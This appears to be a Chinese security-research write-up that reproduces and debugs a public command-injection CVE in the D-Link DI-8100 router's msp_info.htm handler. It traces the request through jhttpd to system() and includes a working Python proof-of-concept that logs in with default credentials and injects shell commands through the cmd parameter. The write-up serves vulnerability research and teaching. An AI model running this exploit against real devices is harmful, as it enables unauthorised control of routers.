# D-Link DI-8100命令注入 && 调试分析
> Raz0r
> 来源：https://www.iotsec-zone.com/article/454

DI-8100是一款D-LINK旗下的上网行为管理认证路由器
下载链接：[http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100](http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100)

复现漏洞
CVE Description
A vulnerability, which was classified as critical, has been found in D-Link DI-8100 16.07. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-273521 was assigned to this vulnerability.

---
# 基础信息

![0.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39i7txetdv7vbla23.png)

# 启动项

firmAE中看一下启动项

![1.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39i8iwnn3h3gshjfl.png)

web程序应该是jhttpd起的。

![2.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39i9801y5djtiuzxm.png)

锁定sbin/rc ，ida查看一下。

![3.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39i9gzxu27qu4uo25.png)

果然是rc里起的服务。
而rc使用

![4.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39i9qtr62edmtf78u.png)

系统启动过程中会执行名为 init 的程序。这个程序通常位于 /sbin/init 或 /bin/init，这里我们做了一个
软链接，所以就会启动rc程序。
但是这里发现init 命令 和直接执行 rc 是有区别的，init才能启动jhttpd。
执行init ,查询系统日志

`cat ./var/log/message`

系统会开始初始化，不断从nvram中读取值和设定值。
而直接运行rc ,系统日志没有从nvram交互数据。

---

# 漏洞描述
Description
A vulnerability, which was classified as critical, has been found in D-Link DI-8100 16.07. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-273521 was assigned to this vulnerability.

msp_info.htm 页面中   cmd参数造成命令执行。

![5.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ibrl61311dikklc.png)
没有这个网页，但jhttpd中有，我们去查看一下。

![6.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ibxjmgj8abcukbk.png)

通过定位字符串，找到了处理函数msp_info_htm

![7.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ic6glfno8tibezg.png)

![8.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39icaowlxyryp5ula.png)

之后这里造成了命名执行
接下来我们来构造调用链

![9.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39iclbmysj0rblrbm.png)
访问目标页面，显示没有flag

![10.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39icubi6d49n0vni7.png)

在这个函数开头，获取了flag的值。
这里根据flag的值，会执行不同命令。
当flag=cmd 时会执行到漏洞点。
httpd_get_parm（）应该是用get的方式获取参数。

![11.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39id20ffqgljgcilr.png)

![12.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39id5f81nazhksbxm.png)

程序继续往下执行了。
但这里显示not cmd

![13.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39idbcvsv3x7gxc5x.png)

系统执行到了这里。我们添加cmd参数

![14.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39idh4lict972nxxo.png)

![15.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39idjyjz2u3iiooqn.png)

程序执行后，返回变化了。
查看no order,please help<br>字符串，发现jhttpd中没有。

![16.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39idrxvn6b3wsnqlh.png)

grep一下 ，发现是在usr/sbin/wys中的字符串

![17.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ie3tpyisbgpvcag.png)

那这就说明，这串命令wys %s > /tmp/msp.info 2>&1已经成功执行了，调用了wys。

这里我们进系统查看wys程序，发现他是一个类似busybox的程序，我们在实际利用中，要多注意这种
程序。例如可能里面的wget等命令，方便我们后续利用。
这里应该是无回显，我们换个命令执行试试。

![18.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39if48wtjd6tdjiqr.png)

![19.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39if8l7jgzmghquwn.png)

这里应该是执行了。

![20.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ifexsv7n0ruxyr7.png)

成功回显。

DI81000_conmand_injection.py
`
import requests

cmd="ls"

session = requests.session()

burp0_url = "http://192.168.0.1:80/login.cgi"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.0.1", "Connection": "close", "Referer": "http://192.168.0.1/login.html", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"user": "admin", "password": "admin"}
session.post(burp0_url, headers=burp0_headers, data=burp0_data)

burp1_url = "http://192.168.0.1:80/msp_info.htm?flag=cmd&cmd=|busybox%20"+cmd
burp1_cookies = {"wys_userid": "admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
response=session.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)

print(response.text)
`

## 漏洞调用链分析

本次动调目的是，我会发送如下这个包，分析jhttpd是如何处理这个包。

![21.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39igrkz2fpxrvpt5l.png)

按照逻辑来说，jhttpd处理这种包时，大概率会从前向后判断。那么肯定会先匹配GET POST请求头，
看它是何种提交方式。
我们搜索POST或者GET ，确定最开始的位置
锁定函数httpd_do_recv（int a1）
这里面用了recv（）函数

![22.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39igyvszhblgdlllq.png)

函数再向上，无引用。那么我们从recv这里开始调试。

![23.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ih4mvu5u64rjkm7.png)

断点：004111D4
动调一下,参数如下

![24.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ihajhkyynrnokjz.png)

```

ssize_t recv(int sockfd, void *buf, size_t len, int flags);

sockfd：套接字描述符，用于标识要接收数据的套接字。
buf：指向接收数据的缓冲区的指针。
len：要接收的最大字节数。
flags：接收操作的附加选项，例如控制接收行为的标志位

*A0   4
*A1   0x5f9610 ◂— 0
*A2   0x18fff
*A3   0x20000

```

所以这里接受的值，都会存在0x5f9610这个buf中

继续向下执行到判断GET字符串的位置。
断点  00411240

![25.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ijantxd0a7o22bx.png)

```
memcmp(a1 + 544, "GET ", 4) 

*A0   0x5f9610 ◂— 0x20544547 ('GET ')
*A1   0x4877bc ◂— addi $s4, $v0, 0x4547 /* 'GET ' */
*A2   0x5f97bb ◂— 0
```

我们查看一下a1+544 处，存储了什么？

![26.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ijrli3cbyjs6k43.png)

发现这里就是我们发送的整个httpd包。那么接下来，他就是需要继续解析这里了。
我们继续深究一下，这里他是用a1作为基地址，后面544作为偏移来取到我们值。

我们查看下a1=0x5f93f0处的值

![27.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ik3z1oqnpytxvge.png)

这里存储了两个值，明显是地址。这里a1应该是个结构体，里面存储了我们发送的httpd数据。
继续调试 进入httpd_dowith_get函数

![28.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ikajck15kt51sna.png)

这个函数前面主要是根据a1这个结构体指针，去取我们的http请求包。通过不断定位字符，例如空格
？ / 等来定位http包中的参数。

![29.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ikgts77j6p6cjxw.png)

我们这里继续动态调试，验证下 。

![30.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ikmgyiwp6qlj3kp.png)

断点
.text:00410F00 la $t9, strncmp

![31.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ikslwqe7jmgfpi2.png)

strncmp(v7, "/usb/", 5)这里比较了，没走if。

![32.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39iky4p6j58dumb0q.png)

之后同样的，会匹配/welcome/ioswificheck.php ，没匹配到，跳过执行。

![33.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39il3s9z0e66y65cx.png)

进入sub_40C860(v7);函数

![34.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ilbil13pv6nyfaz.png)

这里其实v7指向/msp_info.htm?flag=cmd&cmd=|busybox%20ls HTTP/1.1\r\nHost: 192.168.0.1
这里应该是显示错误。
进去sub_40C860(v7)函数后发现参数果然是指向/msp_info.htm?flag=cmd&cmd=|busybox%20ls
HTTP/1.1\r\nHost: 192.168.0.1

![35.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ilmx8a413u5kxwd.png)

进入函数sub_40C860(v7)

![36.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39iltkkudkxhrdcoy.png)

strpbrk(a1, "%+") 搜索 a1 字符串中的第一个 '% ' 或 '+'，如果 a1 中包含 '% ' 或 '+'，则返回指向 a1 中
第一个匹配字符的指针，否则返回空。
这个函数逻辑就是过滤了字符%和+ ，如果含有这连个两个符号，就会进行别的操作。我们的包中没
有% + 中，会直接跳过，然后返回。

![37.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ilywlm9jbcv6cju.png)

执行到00411068，查看v9。

![38.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39im7k2x9ghsekxhr.png)

发现v9是指针，指向flag=cmd&cmd=|busybox%20ls
进入httpd_do_wwwparm函数，这是个处理http包的函数

![39.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39imgd5bo1nu60gmb.png)

主要是匹配 host referer等字符串，然后做了一个赋值操作。
执行跳转到httpd_send_file函数

![40.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39immvb8prjdedf9a.png)

我们执行到get_name_hash

![41.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39imth0td8sc0z5wn.png)

get-namehash调用后，返回值为0x9ad ，这个返回值就是计算的name-hash值。
执行httpd_get_file函数，参数如下

![42.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39imynhtob5jy65u7.png)

httpd_get_file返回值为0，会进入if中

![43.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39in4garm02m5rbg4.png)

继续执行到httpd_find_ext_file(v4, v7)
参数为msp_info.htm 和 0x9ad

![44.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39inbn4is581ggb6z.png)

执行后返回值为一个地址，不为0，进入if判断

![45.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39inhllci4n8uefz2.png)

程序会继续执行向下执行

![46.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39innc0mrg1i9ayoy.png)

上面的V17是一个函数地址，我们在这里下个断点00410E30

![47.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39invmf6p7qkaz4ub.png)

之后这里会跳转到t9 = 0044d74c 处的函数，参数为a1.
a1就是前面分析的包含整个http包的一个结构体指针

![48.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39io450yp1imhicy9.png)

然后我们就进入了危险函数msp_info_htm

![49.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ioac7za91wv5hss.png)

从前端get获取cmd参数，造成system命令执行

执行httpd_get_parm（flag）,结果如下

![50.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39iojsu81vyrgh2us.png)

执行 v16 = (const char *)httpd_get_parm(a1, "cmd");结果如下

![51.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ior95zphgejvxs4.png)

system调用前，下断点，0044D930

![52.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ioy0ggmn6wrnhzz.png)

这里执行了system(wys |busybox ls > /tmp/msp.info 2>&1)
命令成功执行后，会返回到页面上。

![53.png](https://www.iotsec-zone.com/api/image/v2/20240807/d39ip6p6v055cpu1xf.png)

---
漏洞成因：
    从httpd开发者的角度来看，httpd_get_parm(a1, "cmd");这种封装函数，从web端以get方式寻找参数取值，加快了开发的效率。但这种方式一般未做任何过滤，这让恶意攻击者的恶意代码可以通过这种函数直达二进制程序内部。
    若这种函数调用点的之后，存在一些dosytem(),strcpy()等函数，且其参数又正好是我们传入的恶意数据，那就有极大的概率造成命令执行，栈溢出等漏洞
